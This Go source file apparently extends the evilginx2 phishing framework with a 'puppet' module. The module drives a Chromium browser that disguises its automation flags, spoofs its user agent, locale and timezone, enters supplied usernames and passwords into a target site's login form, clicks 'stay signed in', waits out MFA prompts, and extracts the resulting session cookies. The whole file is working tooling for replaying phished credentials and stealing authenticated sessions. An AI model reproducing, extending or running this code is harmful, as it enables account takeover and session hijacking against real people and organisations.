package core

import (
	"regexp"

	"github.com/kgretzky/evilginx2/log"
	"github.com/playwright-community/playwright-go"
)

// Internal global instance
var puppetInstance *Puppet

type Puppet struct {
	pw      *playwright.Playwright
	browser playwright.Browser
}

// InitPuppet initializes the Playwright instance and browser
func InitPuppet() error {
	if puppetInstance != nil {
		return nil
	}

	log.Info("puppet: installing playwright...")
	// Install playwright driver and browsers if needed
	err := playwright.Install()
	if err != nil {
		log.Error("puppet: failed to install playwright: %v", err)
		return err
	}

	pw, err := playwright.Run()
	if err != nil {
		return err
	}

	// Launch browser (chromium)
	log.Info("puppet: launching browser...")
	browser, err := pw.Chromium.Launch(playwright.BrowserTypeLaunchOptions{
		Headless: playwright.Bool(false), // Visible browser as requested
		Args: []string{
			"--disable-blink-features=AutomationControlled",
			"--no-sandbox",
			"--disable-setuid-sandbox",
			"--disable-dev-shm-usage",
			"--disable-gpu",
			"--window-size=1280,720",
		},
	})
	if err != nil {
		return err
	}

	puppetInstance = &Puppet{
		pw:      pw,
		browser: browser,
	}
	return nil
}

// RunPuppetAutomation executes the automation flow for a given config
func RunPuppetAutomation(config *PuppetConfig, credentials map[string]string) ([]map[string]interface{}, error) {
	if puppetInstance == nil {
		if err := InitPuppet(); err != nil {
			return nil, err
		}
	}

	log.Info("[PUPPET] [%s] Launching automation...", config.Name)

	context, err := puppetInstance.browser.NewContext(playwright.BrowserNewContextOptions{
		Viewport:   &playwright.Size{Width: 1280, Height: 720},
		UserAgent:  playwright.String("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
		Locale:     playwright.String("en-US"),
		TimezoneId: playwright.String("America/New_York"),
	})
	if err != nil {
		return nil, err
	}
	defer context.Close()

	page, err := context.NewPage()
	if err != nil {
		return nil, err
	}

	extractUrl := config.Host + config.ExtractPath
	if config.ExtractPath == "" {
		extractUrl = config.Host
	}
	
	log.Info("[PUPPET] [%s] Navigating to %s", config.Name, extractUrl)

	_, err = page.Goto(extractUrl, playwright.PageGotoOptions{
		WaitUntil: playwright.WaitUntilStateNetworkidle,
		Timeout:   playwright.Float(30000),
	})
	if err != nil {
		log.Error("[PUPPET] Navigation error: %v", err)
		// Continue anyway?
	}

	// Auth Flow
	// Wait for username selector
	if config.UsernameSelector != "" {
		log.Debug("[PUPPET] Waiting for username selector: %s", config.UsernameSelector)
		page.WaitForSelector(config.UsernameSelector, playwright.PageWaitForSelectorOptions{Timeout: playwright.Float(10000)})
		if username, ok := credentials["username"]; ok {
			log.Debug("[PUPPET] Entering username")
			page.Fill(config.UsernameSelector, username)
			if config.NextButtonSelector != "" {
				page.Click(config.NextButtonSelector)
				page.WaitForTimeout(2000)
			}
		}
	}

	if config.PasswordSelector != "" {
		if password, ok := credentials["password"]; ok {
			log.Debug("[PUPPET] Waiting for password selector: %s", config.PasswordSelector)
			tryCount := 0
			for tryCount < 3 {
				_, err := page.WaitForSelector(config.PasswordSelector, playwright.PageWaitForSelectorOptions{Timeout: playwright.Float(5000)})
				if err == nil {
					break
				}
				tryCount++
				page.WaitForTimeout(1000)
			}
			
			log.Debug("[PUPPET] Entering password")
			page.Fill(config.PasswordSelector, password)
			if config.SubmitButtonSelector != "" {
				page.Click(config.SubmitButtonSelector)
				page.WaitForTimeout(3000)
			}
		}
	}

	// Stay signed in
	if config.StaySignedInSelector != "" {
		// Just try to click if exists
		elem, err := page.QuerySelector(config.StaySignedInSelector)
		if err == nil && elem != nil {
			log.Debug("[PUPPET] Handling 'Stay signed in'")
			elem.Click()
			page.WaitForTimeout(2000)
		}
	}

	// MFA
	if config.MfaSelector != "" {
		elem, err := page.QuerySelector(config.MfaSelector)
		if err == nil && elem != nil {
			log.Info("[PUPPET] MFA prompt detected - waiting for manual completion (15s)")
			// Capture screenshot maybe?
			page.WaitForTimeout(15000)
		}
	}

	page.WaitForTimeout(5000)

	// Extract cookies
	cookies, err := context.Cookies()
	if err != nil {
		return nil, err
	}

	var cookieList []map[string]interface{}
	for _, c := range cookies {
		cookieList = append(cookieList, map[string]interface{}{
			"name":     c.Name,
			"value":    c.Value,
			"domain":   c.Domain,
			"path":     c.Path,
			"expires":  c.Expires,
			"httpOnly": c.HttpOnly,
			"secure":   c.Secure,
			"sameSite": c.SameSite,
		})
	}

	log.Info("[PUPPET] [%s] Extracted %d cookies", config.Name, len(cookies))
	return cookieList, nil
}

// ClosePuppet cleans up
func ClosePuppet() {
	if puppetInstance != nil {
		if puppetInstance.browser != nil {
			puppetInstance.browser.Close()
		}
		if puppetInstance.pw != nil {
			puppetInstance.pw.Stop()
		}
		puppetInstance = nil
	}
}

type PuppetConfig struct {
	Name                 string `mapstructure:"name"`
	Host                 string `mapstructure:"host"`
	ExtractPath          string `mapstructure:"extract_path"`
	RequestMatch         string `mapstructure:"request_match"`
	ResponseTrigger      string `mapstructure:"response_trigger"`
	UsernameSelector     string `mapstructure:"username_selector"`
	PasswordSelector     string `mapstructure:"password_selector"`
	NextButtonSelector   string `mapstructure:"next_button_selector"`
	SubmitButtonSelector string `mapstructure:"submit_button_selector"`
	StaySignedInSelector string `mapstructure:"stay_signed_in_selector"`
	MfaSelector          string `mapstructure:"mfa_selector"`
	AuthCodeParam        string `mapstructure:"auth_code_param"`

	// Internal regex
	requestMatchRe *regexp.Regexp
}

func (p *PuppetConfig) Compile() error {
	if p.RequestMatch != "" {
		var err error
		p.requestMatchRe, err = regexp.Compile(p.RequestMatch)
		if err != nil {
			return err
		}
	}
	return nil
}
